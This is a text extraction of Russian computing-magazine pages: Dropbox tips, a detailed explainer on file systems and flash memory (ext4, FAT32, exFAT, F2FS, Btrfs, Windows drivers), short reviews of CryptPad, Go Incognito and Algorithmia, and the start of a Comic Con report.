Скрипт входит в бесконечный цикл и ждет изменения файлов в текущей пап-
ке (хорошая идея — запускать его в папке ~/Dropbox/remote). Если изменился
файл in, скрипт читает его, выполняет содержащуюся в файле команду и запи-
сывает результат ее исполнения в out. Пока работает этот скрипт и на машине
запущен Dropbox, любые записанные в файл in команды будут выполнены, не-
зависимо от того, каким образом ты их туда записал — со смартфона, через
сайт или с другой машины.

10. ЧАТ
Если компьютер можно заставить читать записанные в Dropbox команды и при-
сылать ответ, то почему нельзя в эту схему вставить человека и организовать
полноценный чат между двумя людьми? Видимо, именно такой вопрос пришел
в голову автору скрипта Dropbox-Chat. Это крайне простая и по большому сче-
ту бесполезная реализация чата (есть масса других, более приличных спосо-
бов), но она имеет право на жизнь.





                                                                      Dropbox-Chat


Еще пять полезных фишек Dropbox

1. С недавнего времени Dropbox поддерживает функцию File Request. С ее по-
  мощью можно попросить кого угодно отправить тебе определенный файл,
   даже если у этого человека нет аккаунта Dropbox. Все, что необходимо сде-
   лать, — это открыть соответствующее меню на сайте Dropbox, добавить опи-
   сание нужного файла, выбрать папку для сохранения и отправить человеку
   полученную ссылку.
2. В Dropbox есть функция предпросмотра не только обычных изображений,
   аудио и видео, но и файлов формата PDF, SVG и даже PSD и AI.
3. Чтобы пропустить предпросмотр доступного по ссылке файла в браузере
   и сразу загрузить его, достаточно добавить в конец ссылки ?dl=1 или, нао-
   борот, стереть ?dl=0 и поменять www. на dl..
4. Dropbox поддерживает групповую работу над файлами с возможностью
   комментирования. Для этого надо всего лишь создать новую группу в меню
   на сайте dropbox.com.
5. С недавнего времени в Dropbox доступен собственный вариант Google
   Docs под названием Paper. Можно вместе работать над документами пря-
  мо из браузера, составлять списки задач, общаться в комментариях и так
   далее.



ВЫВОДЫ
Главное преимущество Dropbox и других облачных дисков в том, что с помо-
щью файлов можно организовать обмен любыми типами данных, которые бу-
дут доступны буквально отовсюду. В результате Dropbox может заменить мно-
жество специализированных приложений.
PCZONE
СЕКРЕТЫСЕКРЕТЫ

                ИЗУЧАЕМ УНИКАЛЬ-
               НЫЕ ОСОБЕННОСТИ
               ФАЙЛОВЫХ СИСТЕМFSFS





                                                                                     84ckf1r3
                                                                                        84ckf1r3@gmail.com





Почему смартфон может не запускать программы с кар-
ты памяти? Чем ext4 принципиально отличается от ext3?
Почему флешка проживет дольше, если отформатировать
ее в NTFS, а не в FAT? В чем главная проблема F2FS? От-
веты кроются в особенностях строения файловых систем.
О них мы и поговорим.

Файловые системы определяют способ хранения данных. От них зависит,
с какими ограничениями столкнется пользователь, насколько быстрыми бу-
дут операции чтения и записи и как долго накопитель проработает без сбо-
ев. Особенно это касается бюджетных SSD и их младших братьев — флешек.
Зная эти особенности, можно выжать из любой системы максимум и оптими-
зировать ее использование для конкретных задач.
   Выбирать тип и параметры файловой системы приходится всякий раз, когда
надо сделать что-то нетривиальное. Например, требуется ускорить наиболее
частые файловые операции. На уровне файловой системы этого можно достичь
разными способами: индексирование обеспечит быстрый поиск, а предвари-
тельное резервирование свободных блоков позволит упростить перезапись
часто изменяющихся файлов. Предварительная оптимизация данных в опера-
тивной памяти снизит количество требуемых операций ввода-вывода.
   Увеличить срок безотказной эксплуатации помогают такие свойства совре-
менных файловых систем, как отложенная запись, дедупликация и другие про-
двинутые алгоритмы. Особенно актуальны они для дешевых SSD с чипами па-
мяти TLC, флешек и карт памяти.
   Отдельные оптимизации существуют для дисковых массивов разных уров-
ней: например, файловая система может поддерживать упрощенное зеркали-
рование тома, мгновенное создание снимков или динамическое масштабиро-
вание без отключения тома.

ЧЕРНЫЙ ЯЩИК
Пользователи в основном работают с той файловой системой, которая пред-
лагается по умолчанию операционной системой. Они редко создают новые
дисковые разделы и еще реже задумываются об их настройках — просто ис-
пользуют рекомендованные параметры или вообще покупают предварительно
отформатированные носители.
   У поклонников Windows все просто: NTFS на всех дисковых разделах
и FAT32 (или та же NTFS) на флешках. Если же стоит NAS и в нем используется
какая-то другая файловая система, то для большинства это остается за гранью
восприятия. К нему просто подключаются по сети и качают файлы, как из чер-
ного ящика.
  На мобильных гаджетах с Android чаще всего встречается ext4 во внутрен-
ней памяти и FAT32 на карточках microSD. Яблочникам же и вовсе без разницы,
что у них за файловая система: HFS+, HFSX, APFS, WTFS... для них существу-
ют только красивые значки папок и файлов, нарисованные лучшими дизайне-
рами. Богаче всего выбор у линуксоидов, но прикрутить поддержку неродных
для операционки файловых систем можно и в Windows, и в macOS — об этом
чуть позже.

ОБЩИЕ КОРНИ
Различных файловых систем создано свыше сотни, но актуальными можно
назвать чуть больше десятка. Хотя все они разрабатывались для своих спец-
ифических применений, многие в итоге оказались родственными на концеп-
туальном уровне. Они похожи, поскольку используют однотипную структуру
представления (мета)данных — B-деревья («би-деревья»).
   Как и любая иерархическая система, B-дерево начинается с корневой за-
писи и далее ветвится вплоть до конечных элементов — отдельных записей
о файлах и их атрибутах, или «листьев». Основной смысл создания такой ло-
гической структуры был в том, чтобы ускорить поиск объектов файловой си-
стемы на больших динамических массивах — вроде жестких дисков объемом
в несколько терабайт или еще более внушительных RAID-массивов.
   B-деревья требуют гораздо меньше обращений к диску, чем другие типы
сбалансированных деревьев, при выполнении тех же операций. Достигается
это за счет того, что конечные объекты в B-деревьях иерархически располо-
жены на одной высоте, а скорость всех операций как раз пропорциональна
высоте дерева.
   Как и другие сбалансированные деревья, B-trees имеют одинаковую дли-
ну путей от корня до любого листа. Вместо роста ввысь они сильнее ветвятся
и больше растут в ширину: все точки ветвления у B-дерева хранят множество
ссылок на дочерние объекты, благодаря чему их легко отыскать за меньшее
число обращений. Большое число указателей снижает количество самых дли-
тельных дисковых операций — позиционирования головок при чтении произ-
вольных блоков.
   Концепция B-деревьев была сформулирована еще в семидесятых годах
и с тех пор подвергалась различным улучшениям. В том или ином виде она ре-
ализована в NTFS, BFS, XFS, JFS, ReiserFS и множестве СУБД. Все они — род-
ственники с точки зрения базовых принципов организации данных. Отличия
касаются деталей, зачастую довольно важных. Недостаток у родственных фай-
ловых систем тоже общий: все они создавались для работы именно с дисками
еще до появления SSD.

ФЛЕШ-ПАМЯТЬ КАК ДВИГАТЕЛЬ ПРОГРЕССА
Твердотельные накопители постепенно вытесняют дисковые, но пока вынуж-
дены использовать чуждые им файловые системы, переданные по наследству.
Они построены на массивах флеш-памяти, принципы работы которой отлича-
ются от таковых у дисковых устройств. В частности, флеш-память должна сти-
раться перед записью, а эта операция в чипах NAND не может выполняться
на уровне отдельных ячеек. Она возможна только для крупных блоков целиком.
   Связано это ограничение с тем, что в NAND-памяти все ячейки объеди-
нены в блоки, каждый из которых имеет только одно общее подключение
к управляющей шине. Не будем вдаваться в детали страничной организации
и расписывать полную иерархию. Важен сам принцип групповых операций
с ячейками и тот факт, что размеры блоков флеш-памяти обычно больше, чем
блоки, адресуемые в любой файловой системе. Поэтому все адреса и коман-
ды для накопителей с NAND flash надо транслировать через слой абстрагиро-
вания FTL (Flash Translation Layer).
   Совместимость с логикой дисковых устройств и поддержку команд их на-
тивных интерфейсов обеспечивают контроллеры флеш-памяти. Обычно FTL
реализуется именно в их прошивке, но может (частично) выполняться и на хо-
сте — например, компания Plextor пишет для своих SSD драйверы, ускоряю-
щие запись.
  Совсем без FTL не обойтись, поскольку даже запись одного бита в конкрет-
ную ячейку приводит к запуску целой серии операций: контроллер отыскивает
блок, содержащий нужную ячейку; блок считывается полностью, записывается
в кеш или на свободное место, затем стирается целиком, после чего переза-
писывается обратно уже с необходимыми изменениями.
   Такой подход напоминает армейские будни: чтобы отдать приказ одному
солдату, сержант делает общее построение, вызывает бедолагу из строя и ко-
мандует остальным разойтись. В редкой ныне NOR-памяти организация была
спецназовская: каждая ячейка управлялась независимо (у каждого транзисто-
ра был индивидуальный контакт).
   Задач у контроллеров все прибавляется, поскольку с каждым поколени-
ем флеш-памяти техпроцесс ее изготовления уменьшается ради повышения
плотности и удешевления стоимости хранения данных. Вместе с технологиче-
скими нормами уменьшается и расчетный срок эксплуатации чипов.
   Модули с одноуровневыми ячейками SLC имели заявленный ресурс в 100
тысяч циклов перезаписи и даже больше. Многие из них до сих пор работают
в старых флешках и карточках CF. У MLC корпоративного класса (eMLC) ре-
сурс заявлялся в пределах от 10 до 20 тысяч, в то время как у обычной MLC по-
требительского уровня он оценивается в 3–5 тысяч. Память этого типа активно
теснит еще более дешевая TLC, у которой ресурс едва дотягивает до тысячи
циклов. Удерживать срок жизни флеш-памяти на приемлемом уровне прихо-
дится за счет программных ухищрений, и новые файловые системы становят-
ся одним из них.
   Изначально производители предполагали, что файловая система неваж-
на. Контроллер сам должен обслуживать недолговечный массив ячеек памя-
ти любого типа, распределяя между ними нагрузку оптимальным образом.
Для драйвера файловой системы он имитирует обычный диск, а сам выполня-
ет низкоуровневые оптимизации при любом обращении. Однако на практике
оптимизация у разных устройств разнится от волшебной до фиктивной.
  В корпоративных SSD встроенный контроллер — это маленький компью-
тер. У него есть огромный буфер памяти (полгига и больше), и он поддержи-
вает множество методов повышения эффективности работы с данными, что
позволяет избегать лишних циклов перезаписи. Чип упорядочивает все блоки
в кеше, выполняет отложенную запись, производит дедупликацию на лету, ре-
зервирует одни блоки и очищает в фоне другие. Все это волшебство проис-
ходит абсолютно незаметно для ОС, программ и пользователя. С таким SSD
действительно непринципиально, какая файловая система используется. Вну-
тренние оптимизации оказывают гораздо большее влияние на производи-
тельность и ресурс, чем внешние.
  В бюджетные SSD (и тем более — флешки) ставят куда менее умные кон-
троллеры. Кеш в них урезан или отсутствует, а продвинутые серверные тех-
нологии не применяются вовсе. В картах памяти контроллеры настолько при-
митивные, что часто утверждается, будто их нет вовсе. Поэтому для дешевых
устройств с флеш-памятью остаются актуальными внешние методы баланси-
ровки нагрузки — в первую очередь при помощи специализированных файло-
вых систем.

ОТ JFFS К F2FS
Одной из первых попыток написать файловую систему, которая бы учитывала
принципы организации флеш-памяти, была JFFS — Journaling Flash File System.
Изначально эта разработка шведской фирмы Axis Communications была ори-
ентирована на повышение эффективности памяти сетевых устройств, кото-
рые Axis выпускала в девяностых. Первая версия JFFS поддерживала только
NOR-память, но уже во второй версии подружилась с NAND.
   Сейчас JFFS2 имеет ограниченное применение. В основном она все так же
используется в дистрибутивах Linux для встраиваемых систем. Ее можно найти
в маршрутизаторах, IP-камерах, NAS и прочих завсегдатаях интернета вещей.
В общем, везде, где требуется небольшой объем надежной памяти.
   Дальнейшей попыткой развития JFFS2 стала LogFS, у которой индексные
дескрипторы хранились в отдельном файле. Авторы этой идеи — сотрудник
немецкого подразделения IBM Йорн Энгель и преподаватель Оснабрюкского
университета Роберт Мертенс. Исходный код LogFS выложен на GitHub. Судя
по тому, что последнее изменение в нем было сделано четыре года назад,
LogFS так и не обрела популярность.
   Зато эти попытки подстегнули появление другой специализированной фай-
ловой системы — F2FS. Ее разработали в корпорации Samsung, на долю кото-
рой приходится немалая часть производимой в мире флеш-памяти. В Samsung
делают чипы NAND Flash для собственных устройств и по заказу других ком-
паний, а также разрабатывают SSD с принципиально новыми интерфейсами
вместо унаследованных дисковых. Создание специализированной файловой
системы с оптимизацией для флеш-памяти было с точки зрения Samsung дав-
но назревшей необходимостью.
   Четыре года назад, в 2012 году, в Samsung создали F2FS (Flash Friendly
File System). Ее идея хороша, но реализация оказалась сыроватой. Ключевая
задача при создании F2FS была проста: снизить число операций перезапи-
си ячеек и распределить нагрузку на них максимально равномерно. Для это-
го требуется выполнять операции с несколькими ячейками в пределах того же
блока одновременно, а не насиловать их по одной. Значит, нужна не мгновен-
ная перезапись имеющихся блоков по первому запросу ОС, а кеширование
команд и данных, дозапись новых блоков на свободное место и отложенное
стирание ячеек.
   Сегодня поддержка F2FS уже официально реализована в Linux (а значит,
и в Android), но особых преимуществ на практике она пока не дает. Основ-
ная особенность этой файловой системы (отложенная перезапись) привела
к преждевременным выводам о ее эффективности. Старый трюк с кеширова-
нием даже одурачивал ранние версии бенчмарков, где F2FS демонстрирова-
ла мнимое преимущество не на несколько процентов (как ожидалось) и даже
не в разы, а на порядки. Просто драйвер F2FS рапортовал о выполнении опе-
рации, которую контроллер только планировал сделать. Впрочем, если ре-
альный прирост производительности у F2FS и невелик, то износ ячеек опре-
деленно будет меньше, чем при использовании той же ext4. Те оптимизации,
которые не сможет сделать дешевый контроллер, будут выполнены на уровне
самой файловой системы.

ЭКСТЕНТЫ И БИТОВЫЕ КАРТЫ
Пока F2FS воспринимается как экзотика для гиков. Даже в собственных смарт-
фонах Samsung все еще применяется ext4. Многие считают ее дальнейшим
развитием ext3, но это не совсем так. Речь идет скорее о революции, чем
о преодолении барьера в 2 Тбайт на файл и простом увеличении других коли-
чественных показателей.
   Когда компьютеры были большими, а файлы — маленькими, адресация
не представляла сложностей. Каждому файлу выделялось энное количество
блоков, адреса которых заносились в таблицу соответствия. Так работала
и файловая система ext3, остающаяся в строю до сих пор. А вот в ext4 появил-
ся принципиально другой способ адресации — экстенты.





                                               Создаем раздел ext4 в Windows 7


Экстенты можно представить как расширения индексных дескрипторов в виде
обособленных наборов блоков, которые адресуются целиком как непрерыв-
ные последовательности. Один экстент может содержать целый файл сред-
него размера, а для крупных файлов достаточно выделить десяток-другой эк-
стентов. Это куда эффективнее, чем адресовать сотни тысяч мелких блоков
по четыре килобайта.
   Поменялся в ext4 и сам механизм записи. Теперь распределение блоков
происходит сразу за один запрос. И не заранее, а непосредственно перед за-
писью данных на диск. Отложенное многоблочное распределение позволяет
избавиться от лишних операций, которыми грешила ext3: в ней блоки для но-
вого файла выделялись сразу, даже если он целиком умещался в кеше и пла-
нировался к удалению как временный.





                                       Управляем разделами ext3/ext4 в Windows


ДИЕТА С ОГРАНИЧЕНИЕМ FAT
Помимо сбалансированных деревьев и их модификаций, есть и другие попу-
лярные логические структуры. Существуют файловые системы с принципи-
ально другим типом организации — например, линейным. Как минимум одной
из них ты наверняка часто пользуешься.

Загадка

Отгадай загадку: в двенадцать она начала полнеть, к шестнадцати была глу-
поватой толстушкой, а к тридцати двум стала жирной, так и оставшись про-
стушкой. Правильно, это история про файловую систему FAT. Требования со-
вместимости обеспечили ей дурную наследственность. На дискетах она была
12-разрядной, на жестких дисках — поначалу 16-битной, а до наших дней до-
шла уже как 32-разрядная. В каждой следующей версии увеличивалось число
адресуемых блоков, но в самой сути ничего не менялось.



Популярная до сих пор файловая система FAT32 появилась аж двадцать лет
назад. Сегодня она все так же примитивна и не поддерживает ни списки управ-
ления доступом, ни дисковые квоты, ни фоновое сжатие, ни другие современ-
ные технологии оптимизации работы с данными.
   Зачем же FAT32 нужна в наши дни? Все так же исключительно для обе-
спечения совместимости. Производители справедливо полагают, что раз-
дел с FAT32 сможет прочитать любая ОС. Поэтому именно его они создают
на внешних жестких дисках, USB Flash и картах памяти.

Как освободить
флеш-память смартфона

Карточки  microSD(HC),  используе-
мые в смартфонах, по умолчанию
отформатированы в FAT32. Это ос-
новное препятствие для установки
на них приложений и переноса дан-
ных из внутренней памяти. Чтобы его
преодолеть, нужно создать на кар-
точке раздел с ext3 или ext4. На него
можно  перенести  все  файловые
атрибуты (включая владельца и пра-
ва доступа), поэтому любое прило-
жение сможет работать так, словно
запустилось из внутренней памяти.
   Windows   не   умеет   делать
на флешках больше одного раздела,
но для этого можно запустить Linux
(хотя бы в виртуалке) или продвину-
тую утилиту для работы с логической
разметкой —  например,  MiniTool
Partition  Wizard  Free.  Обнаружив
на карточке дополнительный первич-
ный раздел с ext3/ext4, приложение                                       Приложение Link2SD определило вто-
Link2SD и аналогичные ему пред-     рой раздел на карточке microSD
ложат куда больше вариантов, чем
в случае с одним разделом FAT32.



Как еще один аргумент в пользу выбора FAT32 часто на-
зывают отсутствие в ней журналирования, а значит, более
быстрые операции записи и меньший износ ячеек памяти
NAND Flash. На практике же использование FAT32 приво-
дит к обратному и порождает множество других проблем.
  Флешки и карты памяти как раз быстро умирают из-за        INFO
того, что любое изменение в FAT32 вызывает перезапись
                                                                      Для FAT32 и NTFS
одних и тех же секторов, где расположены две цепоч-                                                                                теоретические
ки файловых таблиц. Сохранил веб-страничку целиком,        ограничения
и она перезаписалась раз сто — с каждым добавлением         по уровню
                                                                             вложенностина флешку очередной мелкой гифки. Запустил портей-                                                                             не указаны,
бл-софт? Он насоздавал временных файлов и постоян-       но на практике
но меняет их во время работы. Поэтому гораздо лучше      они одинаковые:
                                                                              в каталоге первогоиспользовать на флешках NTFS с ее устойчивой к сбоям
                                                                              уровня можно
таблицей $MFT. Мелкие файлы могут храниться прямо                                                                                 создать только
в главной файловой таблице, а ее расширения и копии     7707 подкаталогов.
записываются в разные области флеш-памяти. Вдобавок     Любители поиграть
                                                                              в матрешки оценят.благодаря индексации на NTFS поиск выполняется бы-
стрее.
   Другая проблема, с которой сталкивается большинство пользователей, —
на раздел с FAT32 невозможно записать файл больше 4 Гбайт. Причина за-
ключается в том, что в FAT32 размер файла описывается 32 битами в табли-
це размещения файлов, а 2^32 (минус единица, если быть точным) как раз
дают четыре гига. Получается, что на свежекупленную флешку нельзя записать
ни фильм в нормальном качестве, ни образ DVD.
   Копирование больших файлов еще полбеды: при попытке сделать это
ошибка хотя бы видна сразу. В других ситуациях FAT32 выступает в роли бом-
бы замедленного действия. Например, ты скопировал на флешку портей-
бл-софт и на первых порах пользуешься им без проблем. Спустя длительное
время у одной из программ (допустим, бухгалтерской или почтовой) база дан-
ных раздувается, и... она просто перестает обновляться. Файл не может быть
перезаписан, поскольку достиг лимита в 4 Гбайт.
  Менее очевидная проблема заключается в том, что в FAT32 дата созда-
ния файла или каталога может быть задана с точностью до двух секунд. Это-
го недостаточно для многих криптографических приложений, использую-
щих временные метки. Низкая точность атрибута «дата» — еще одна причина
того, почему FAT32 не рассматривается как полноценная файловая система
с точки зрения безопасности. Однако ее слабые стороны можно использо-
вать и в своих целях. Например, если скопировать на том FAT32 любые файлы
с раздела NTFS, то они очистятся от всех метаданных, а также унаследованных
и специально заданных разрешений. FAT просто не поддерживает их.

EXFAT
В отличие от FAT12/16/32, exFAT разрабатывалась специально для USB Flash
и карт памяти большого (≥ 32 Гбайт) объема. Extended FAT устраняет упомя-
нутый выше недостаток FAT32 — перезаписывание одних и тех же секторов
при любом изменении. Как у 64-разрядной системы, у нее нет практически
значимых лимитов на размер одного файла. Теоретически он может иметь
длину в 2^64 байт (16 Эбайт), а карточки такого объема появятся нескоро.
  Еще одно принципиальное отличие exFAT — поддержка списков контро-
ля доступа (ACL). Это уже не та простушка из девяностых, однако внедрению
exFAT мешает закрытость формата. Поддержка exFAT полноценно и легально
реализована только в Windows (начиная с XP SP2) и OS X (начиная с 10.6.5).
В Linux и *BSD она поддерживается либо с ограничениями, либо не вполне за-
конно. Microsoft требует лицензировать использование exFAT, и в этой обла-
сти много правовых споров.

BTRFS
Еще один яркий представитель файловых систем на основе B-деревьев назы-
вается Btrfs. Эта ФС появилась в 2007 году и изначально создавалась в Oracle
с прицелом на работу с SSD и RAID. Например, ее можно динамически мас-
штабировать: создавать новые индексные дескрипторы прямо в работающей
системе или разделять том на подтома без выделения им свободного места.
   Реализованный в Btrfs механизм копирования при записи и полная инте-
грация с модулем ядра Device mapper позволяют делать практически мгно-
венные снапшоты через виртуальные блочные устройства. Предварительное
сжатие данных (zlib или lzo) и дедупликация ускоряют основные операции, за-
одно продлевая время жизни флеш-памяти. Особенно это заметно при рабо-
те с базами данных (достигается сжатие в 2–4 раза) и мелкими файлами (они
записываются упорядоченно крупными блоками и могут храниться непосред-
ственно в «листьях»).
   Также Btrfs поддерживает режим полного журналирования (данных и мета-
данных), проверку тома без размонтирования и множество других современ-
ных фич. Код Btrfs опубликован под лицензией GPL. Эта файловая система
поддерживается в Linux как стабильная начиная с версии ядра 4.3.1.

БОРТОВЫЕ ЖУРНАЛЫ
Практически все более-менее современные файловые системы (ext3/ext4,
NTFS, HFSX, Btrfs и другие) относят к общей группе журналируемых, посколь-
ку они ведут учет вносимых изменений в отдельном логе (журнале) и сверяют-
ся с ним в случае сбоя при выполнении дисковых операций. Однако степень
подробности ведения журналов и отказоустойчивость у этих файловых систем
разные.
   Еxt3 поддерживает три режима ведения журнала: с обратной связью, упо-
рядоченный и полное журналирование. Первый режим подразумевает запись
только общих изменений (метаданных), выполняемую асинхронно по отноше-
нию к изменениям самих данных. Во втором режиме выполняется та же за-
пись метаданных, но строго перед внесением любых изменений. Третий ре-
жим эквивалентен полному журналированию (изменений как в метаданных, так
и в самих файлах).
   Целостность данных обеспечивает только последний вариант. Остальные
два лишь ускоряют выявление ошибок в ходе проверки и гарантируют восста-
новление целостности самой файловой системы, но не содержимого файлов.
   Журналирование в NTFS похоже на второй режим ведения лога в ext3.
В журнал записываются только изменения в метаданных, а сами данные в слу-
чае сбоя могут быть утеряны. Такой метод ведения журнала в NTFS задумы-
вался не как способ достижения максимальной надежности, а лишь как ком-
промисс между быстродействием и отказоустойчивостью. Именно поэтому
люди, привыкшие к работе с полностью журналируемыми системами, считают
NTFS псевдожурналируемой.
   Реализованный в NTFS подход в чем-то даже лучше
используемого по умолчанию в ext3. В NTFS дополни-
тельно периодически создаются контрольные точки, ко-
торые гарантируют выполнение всех отложенных ранее
дисковых операций. Контрольные точки не имеют ниче-
го общего с точками восстановления в \System Volume
Infromation\. Это просто служебные записи в логе.         WARNING
   Практика показывает, что такого частичного журнали-                                                                           Большинство
рования NTFS в большинстве случаев хватает для беспро-      драйверов и плагинов
блемной работы. Ведь даже при резком отключении         для поддержки
                                                                            сторонних файловыхпитания дисковые устройства не обесточиваются мгно-
                                                                            систем имеют
венно. Блок питания и многочисленные конденсаторы                                                                           свои ограничения
в самих накопителях обеспечивают как раз тот минималь-      и не всегда работают
ный запас энергии, которого хватает на завершение теку-         стабильно. Они
                                                                              могут конфликтоватьщей операции записи. Современным SSD при их быстро-                                                                            с другими драйверами,
действии и экономичности такого же количества энергии         антивирусами
обычно хватает и на выполнение отложенных операций.        и программами
                                                                                виртуализации.Попытка же перейти на полное журналирование снизила
бы скорость большинства операций в разы.

ПОДКЛЮЧАЕМ СТОРОННИЕ ФС В WINDOWS
Использование файловых систем лимитировано их поддержкой на уровне ОС.
Например, Windows не понимает ext2/3/4 и HFS+, а использовать их порой
надо. Сделать это можно, добавив соответствующий драйвер.
   Открытый драйвер ext2fsd для чтения и записи на разделы ext2/3 с частич-
ной поддержкой ext4. В последней версии поддерживаются экстенты и разде-
лы объемом до 16 Тбайт. Не поддерживаются LVM, списки контроля доступа
и расширенные атрибуты.





                                           Монтируем раздел ext4 в Windows 10


Существует бесплатный плагин ext4tc для Total Commander. Поддерживает
чтение разделов ext2/3/4.





                            Плагин для Total Commander добавляет поддержку ext4


coLinux — открытый и бесплатный порт ядра Linux. Вместе с 32-битным драй-
вером он позволяет запускать Linux в среде Windows с 2000 по 7 без исполь-
зования технологий виртуализации. Поддерживает только 32-битные версии.
Разработка 64-битной модификации была отменена. сoLinux позволяет в том
числе организовать из Windows доступ к разделам ext2/3/4. Поддержка проек-
та приостановлена в 2014 году.
   Возможно, в Windows 10 уже есть встроенная поддержка характерных
для Linux файловых систем, просто она скрыта. На эти мысли наводит драйвер
уровня ядра Lxcore.sys и сервис LxssManager, который загружается как би-
блиотека процессом Svchost.exe. Подробнее об этом смотри в докладе (pdf)
Алекса Ионеску «Ядро Линукс, скрытое внутри Windows 10», с которым он вы-
ступил на Black Hat 2016.





            Смонтировав том ext4 в Windows, можно работать с ним как с любым другим

ExtFS for Windows — платный драйвер, выпускаемый компанией Paragon. Он
работает в Windows с 7 по 10, поддерживает доступ к томам ext2/3/4 в режиме
чтения и записи. Обеспечивает почти полную поддержку ext4 в Windows.
  HFS+ for Windows 10 — еще один проприетарный драйвер производства
Paragon Software. Несмотря на название, работает во всех версиях Windows
начиная с XP. Предоставляет полный доступ к файловым системам HFS+/HFSX
на дисках с любой разметкой (MBR/GPT).
   WinBtrfs — ранняя разработка драйвера Btrfs для Windows. Уже в версии 0.6
поддерживает доступ к томам Btrfs как на чтение, так и на запись. Умеет обра-
батывать жесткие и символьные ссылки, поддерживает альтернативные пото-
ки данных, ACL, два вида компрессии и режим асинхронного чтения/записи.
Пока WinBtrfs не умеет использовать mkfs.btrfs, btrfs-balance и другие утилиты
для обслуживания этой файловой системы.





                                 WWW

                                                                                Ext2Fsd

                                                                                      WinBtrfs

                                                                             Link2SD
PC ZONE





                                            Андрей Письменный
                                                      apismenny@gmail.com




       CRYPTPAD — АНАЛОГ GOOGLE DOCS С ШИФРОВАНИЕМ
1





                            У текстового редактора Google Docs есть масса достоинств,
         но есть и один недостаток, который в определенных случаях оказы-
          вается весьма серьезным: то, что ты в нем напишешь, будет хранить-
          ся на сервере Google. CryptPad — это онлайновый коллаборативный
          редактор, который пересылает данные только в зашифрованном
          виде, а для разрешения конфликтов правок использует блокчейн.
          В CryptPad встроено целых пять редакторов: WYSIWYG Pad,
         предназначенный для текстовых документов, Code Pad для кода,
         а также редактор несложных презентаций с синтаксисом Markdown
         и средство для создания опросов. Выбирай любой и создавай до-
          кумент.





         Поделиться ссылкой для совместной работы не составляет труда:
         копируй адрес из адресной строки и отправляй всем, кого хочешь
          пригласить к редактированию. Если планируешь только показать
          документ, но не давать вносить правки, жми на кнопку с глазом,
         и она выдаст соответствующую ссылку.
            Собственно, в ссылке и будет содержаться ключ, необходи-
        мый для расшифровки документа. Ключ записан после символа
         # и не передается на сервер. Кстати, главная техническая зада-
            ча, которую решили разработчики CryptPad, — это синхронизация
         версий документов без их расшифровки. Достичь этого удалось
         благодаря использованию метода операциональных преобразова-
         ний на основе блокчейна.





          Увы, по функциональности CryptPad во многом не дотягивает
         до Google Docs. К примеру, здесь нет системы контроля версий,
         комментариев и подсветки позиции курсоров других пользова-
          телей (компоненты CKEditor и CodeMirror, которые используются
          в CryptPad, просто не поддерживают такой функции).
            Исходники CryptPad и его базового компонента под названи-
        ем ChainPad открыты — их можно скачать с GitHub и развернуть
         на своем сервере. Кстати, используя чужой CryptPad, будь осто-
          рожен: его код может быть модифицирован таким образом, чтобы
         пересылать ключ шифрования на сервер или, наоборот, присылать
         с сервера вредоносный JavaScript. О теоретической возможности
         подобных атак предупреждают сами разработчики.

      GO INCOGNITO — ПЛАГИН ДЛЯ ТЕХ, КТО ПОСТОЯННО ЗАБЫ-
       ВАЕТ ВКЛЮЧИТЬ ПОРНОРЕЖИМ В CHROME
2





                            Режим  «Инкогнито»,  придуманный  разработчиками  Google
         Chrome, — прекрасная штука: ходишь по сайтам и не оставляешь
         на компьютере никаких следов своих действий. Одна проблема: нуж-
         но не забывать включать Incognito до того, как зайдешь на сайт, адрес
          которого не должен попасть в History. Плагин Go Incognito — это удоб-
         ное средство, которое позволяет легко выходить из этой ситуации.





         Собственно, проблема несложно решается без всяких плагинов:
         историю посещений можно почистить целиком или найти компро-
         метирующие адреса и стереть выборочно (ведь пустота в History
         тоже может оказаться подозрительной!). Но если ошибаешься си-
          стематически (к примеру, машинально вбивая на рабочем компью-
          тере адреса, которые лучше бы не светить), то неплохо бы иметь
         простой способ исправления такой ошибки.
          Go Incognito дает тебе одну крайне полезную кнопку. Нажатие
         на нее (или на Alt + I) приводит к тому, что текущая вкладка откры-
          вается в новом окне в режиме Incognito, а адрес открытого в ней
          сайта стирается из истории посещений. Это настолько комфортно,
          что заставляет задуматься: были ли у разработчиков браузеров ка-
          кие-то соображения, которые помешали сразу так сделать?


        ALGORITHMIA — API К DEEP LEARNING, РЫНОК АЛГОРИТМОВ
      И АВТОРАСКРАСКА ФОТОГРАФИЙ
3





                            Вещи, перечисленные в заголовке, казалось бы, имеют мало об-
          щего. Но в реальности они принадлежат одной команде разработчи-
          ков и размещены на одном сайте. Начнем с последнего пункта, по-
          скольку он веселее всего и опробовать его сможет любой желающий.
           Ты наверняка видел в интернете черно-белые фотографии, рас-
         крашенные любителями «Фотошопа». Люди тратят многие часы,
         чтобы превратить тусклый старый снимок в подобие нового и цвет-
           ного. Обычно нет особых сомнений относительно того, какого
          цвета были объекты. Лица, трава, небо, листва деревьев и прочие
        вещи мало изменились за последние сто лет. Так что угадать не-
          сложно, да и цена ошибки невелика.
         С начала бума глубоких нейросетей прошло не так много вре-
          мени, а они уже почти способны заменить человека в деле раскра-
         шивания черно-белых снимков. В частности, на сайте Algorithmia
          есть неплохо работающее демо такой технологии. Все, что нужно
         для работы с ним, — это вставить ссылку на черно-белую картинку
          в интернете. Загрузить изображение с диска, к сожалению, не вы-
           йдет, так что картинку придется где-нибудь захостить — например,
          закинуть в Dropbox.
            Секунд через пять твоя картинка будет раскрашена робохудож-
          ником. Насколько правдоподобно — это уже судить тебе. Тут и там
         цветовые пятна могут выглядеть кривовато, но в целом результат
         скорее приятно удивляет, чем смешит.
           Переходим к более сложной части. На самом деле Algorithmia —
          это вполне серьезный ресурс, и страницу с раскраской на нем раз-
         местили исключительно в рекламных целях. Стоящая за ней ком-
         пания специализируется на разработке алгоритмов для анализа
         различных датасетов и выдачи рекомендаций или предсказаний.
         К примеру, клиентам предлагается движок, рекомендующий ново-
          сти на основании интересов читателей, алгоритм для поиска пред-
         метов на снимках и прочие полезные вещи.





        Не менее интересно выглядит «рынок алгоритмов» — раздел, в ко-
         тором разработчик может опубликовать свой алгоритм и получать
         вознаграждение в том случае, если API будет использовать кто-то
          из клиентов Algorithmia. Или можно стать таким клиентом, заплатив
         определенную сумму и получив за нее сколько-то кредитов, потре-
         бляемых в ходе обращения к API. А если нужного алгоритма нет, то
        можно заказать его разработку, объявив сумму вознаграждения.
          Или, наоборот, взяться подработать этим, если владеешь необхо-
        димыми скиллами.
    СЦЕНА




              НАШ ОТЧЕТ ИЗ ДИСНЕЙЛЕНДА
                ДЛЯ ВСЕХ ГИКОВ И НЕРДОВ
COMIC CON
RUSSIA 2016





     Большинство наших читателей определенно хорошо зна-
